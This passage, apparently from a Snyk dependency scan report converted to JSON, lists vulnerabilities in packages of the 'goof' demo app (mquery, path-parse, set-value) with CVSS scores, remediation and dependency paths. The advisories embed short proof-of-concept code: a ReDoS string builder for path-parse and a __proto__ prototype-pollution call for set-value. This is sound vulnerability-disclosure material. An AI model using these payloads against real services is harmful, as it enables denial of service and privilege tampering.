\"2021-03-30T09:50:31Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"3.2.5\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-MQUERY-1089718\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-1321\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-03-30T14:57:04.308247Z\",\n  \"moduleName\": \"mquery\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"mquery\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2021-03-30T14:57:04.262984Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/aheckmann/mquery/commit/158f059e058579d2d08c2f1380689f5f69336778\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/aheckmann/mquery/pull/121\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<3.2.5\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"mongoose@4.2.4\",\n    \"mquery@1.6.3\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"mongoose@5.12.3\",\n    \"mquery@3.2.5\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"mquery\",\n  \"version\": \"1.6.3\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , mongoose@4.2.4 , mquery@1.6.3 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2021-23343"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "SNYK-JS-PATHPARSE-1077067",
          "desc": "## Overview\n[path-parse](https://www.npmjs.org/package/path-parse) is a Node.js path.parse() ponyfill\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via `splitDeviceRe`, `splitTailRe`, and `splitPathRe` regular expressions. ReDoS exhibits polynomial worst-case time complexity.\r\n\r\n### PoC\r\n```\r\nvar pathParse = require('path-parse');\r\nfunction build_attack(n) {\r\n    var ret = \"\"\r\n    for (var i = 0; i < n; i++) {\r\n        ret += \"/\"\r\n    }\r\n    return ret + \"◎\";\r\n}\r\n\r\nfor(var i = 1; i <= 5000000; i++) {\r\n    if (i % 10000 == 0) {\r\n        var time = Date.now();\r\n        var attack_str = build_attack(i)\r\n        pathParse(attack_str);\r\n        var time_cost = Date.now() - time;\r\n        console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\r\n }\r\n}\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `path-parse` to version 1.0.7 or higher.\n## References\n- [GitHub Issue 1](https://github.com/jbgutierrez/path-parse/issues/8)\n- [GitHub PR](https://github.com/jbgutierrez/path-parse/pull/10)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-02-19T16:00:22.449519Z\",\n  \"credit\": [\n    \"Yeting Li\"\n  ],\n  \"cvssScore\": 5.3,\n  \"description\": \"## Overview\\n[path-parse](https://www.npmjs.org/package/path-parse) is a Node.js path.parse() ponyfill\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via `splitDeviceRe`, `splitTailRe`, and `splitPathRe` regular expressions. ReDoS exhibits polynomial worst-case time complexity.\\r\\n\\r\\n### PoC\\r\\n```\\r\\nvar pathParse = require('path-parse');\\r\\nfunction build_attack(n) {\\r\\n    var ret = \\\"\\\"\\r\\n    for (var i = 0; i < n; i++) {\\r\\n        ret += \\\"/\\\"\\r\\n    }\\r\\n    return ret + \\\"◎\\\";\\r\\n}\\r\\n\\r\\nfor(var i = 1; i <= 5000000; i++) {\\r\\n    if (i % 10000 == 0) {\\r\\n        var time = Date.now();\\r\\n        var attack_str = build_attack(i)\\r\\n        pathParse(attack_str);\\r\\n        var time_cost = Date.now() - time;\\r\\n        console.log(\\\"attack_str.length: \\\" + attack_str.length + \\\": \\\" + time_cost+\\\" ms\\\")\\r\\n }\\r\\n}\\r\\n```\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `path-parse` to version 1.0.7 or higher.\\n## References\\n- [GitHub Issue 1](https://github.com/jbgutierrez/path-parse/issues/8)\\n- [GitHub PR](https://github.com/jbgutierrez/path-parse/pull/10)\\n\",\n  \"disclosureTime\": \"2021-02-19T15:54:01Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"1.0.7\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-PATHPARSE-1077067\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2021-23343\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-08-08T13:56:55.024375Z\",\n  \"moduleName\": \"path-parse\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"path-parse\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2021-05-04T08:38:49Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Issue 1\",\n      \"url\": \"https://github.com/jbgutierrez/path-parse/issues/8\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/jbgutierrez/path-parse/pull/10\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<1.0.7\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"istanbul-lib-report@1.1.3\",\n    \"path-parse@1.0.5\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"istanbul-lib-report@1.1.3\",\n    \"path-parse@1.0.7\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"path-parse\",\n  \"version\": \"1.0.5\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-report@1.1.3 , path-parse@1.0.5 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "1321"
            ],
            "cveid": [
              "2021-23440"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-SETVALUE-1540541",
          "desc": "## Overview\n[set-value](https://www.npmjs.com/package/set-value) is a package that creates nested values and any intermediaries using dot notation ('a.b.c') paths.\n\nAffected versions of this package are vulnerable to Prototype Pollution. A type confusion vulnerability can lead to a bypass of CVE-2019-10747 when the user-provided keys used in the `path` parameter are arrays.\r\n\r\n\r\n### PoC\r\n```\r\nconst set = require(\"set-value\")\r\n\r\n// set({}, ['__proto__','polluted'], 'yes');\r\n// console.log(polluted); // Error: Cannot set unsafe key: \"__proto__\"\r\n\r\nset({}, [['__proto__'],'polluted'], 'yes');\r\nconsole.log(polluted);\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `set-value` to version 4.0.1, 2.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/jonschlinkert/set-value/commit/7cf8073bb06bf0c15e08475f9f952823b4576452)\n- [GitHub PR](https://github.com/jonschlinkert/set-value/pull/33)\n- [Huntr Bounty Report](https://www.huntr.dev/bounties/2eae1159-01de-4f82-a177-7478a408c4a2/)\n- [Snyk Blog](https://snyk.io/blog/remediate-javascript-type-confusion-bypassed-input-validation/)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-08-12T16:49:06.015288Z\",\n  \"credit\": [\n    \"Alessio Della Libera\",\n    \"ready-research\"\n  ],\n  \"cvssScore\": 7.3,\n  \"description\": \"## Overview\\n[set-value](https://www.npmjs.com/package/set-value) is a package that creates nested values and any intermediaries using dot notation ('a.b.c') paths.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. A type confusion vulnerability can lead to a bypass of CVE-2019-10747 when the user-provided keys used in the `path` parameter are arrays.\\r\\n\\r\\n\\r\\n### PoC\\r\\n```\\r\\nconst set = require(\\\"set-value\\\")\\r\\n\\r\\n// set({}, ['__proto__','polluted'], 'yes');\\r\\n// console.log(polluted); // Error: Cannot set unsafe key: \\\"__proto__\\\"\\r\\n\\r\\nset({}, [['__proto__'],'polluted'], 'yes');\\r\\nconsole.log(polluted);\\r\\n```\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `set-value` to version 4.0.1, 2.0.1 or higher.\\n## References\\n- [GitHub Commit](https://github.com/jonschlinkert/set-value/commit/7cf8073bb06bf0c15e08475f9f952823b4576452)\\n- [GitHub PR](https://github.com/jonschlinkert/set-value/pull/33)\\n- [Huntr Bounty Report](https://www.huntr.dev/bounties/2eae1159-01de-4f82-a177-7478a408c4a2/)\\n- [Snyk Blog](https://snyk.io/blog/remediate-javascript-type-confusion-bypassed-input-validation/)\\n\",\n  \"disclosureTime\": \"2021-08-12T16:49:03Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"4.0.1\",\n    \"2.0.1\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-SETVALUE-1540541\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2021-23440\"\n    ],\n    \"CWE\": [\n      \"CWE-1321\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-11-05T14:27:18.657314Z\",\n  \"moduleName\": \"set-value\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"set-value\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2021-09-12T12:24:31Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/jonschlinkert/set-value/commit/7cf8073bb06bf0c15e08475f9f952823b4576452\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/jonschlinkert/set-value/pull/33\"\n    },\n    {\n      \"title\": \"Huntr Bounty Report\",\n      \"url\": \"https://www.huntr.dev/bounties/2eae1159-01de-4f82-a177-7478a408c4a2/\"\n    },\n    {\n      \"title\": \"Snyk Blog\",\n      \"url\": \"https://snyk.io/blog/remediate-javascript-type-confusion-bypassed-input-validation/\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=3.0.0 <4.0.1\",\n      \"<2.0.1\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"micromatch@3.1.10\",\n    \"snapdragon@0.8.2\",\n    \"base@0.11.2\",\n    \"cache-base@1.0.1\",\n    \"set-value@2.0.0\"\n  ],\n  \"upgradePath\": [],\n  \"isUpgradable\": false,\n  \"isPatchable\": false,\n  \"name\": \"set-value\",\n  \"version\": \"2.0.0\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , braces@2.3.2 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , extglob@2.0.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , nanomatch@1.2.9 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , braces@2.3.2 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , extglob@2.0.4 , expand-brackets@2.1.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , extglob@2.0.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , nanomatch@1.2.9 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , extglob@2.0.4 , expand-brackets@2.1.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , braces@2.3.2 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , extglob@2.0.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , nanomatch@1.2.9 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , braces@2.3.2 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
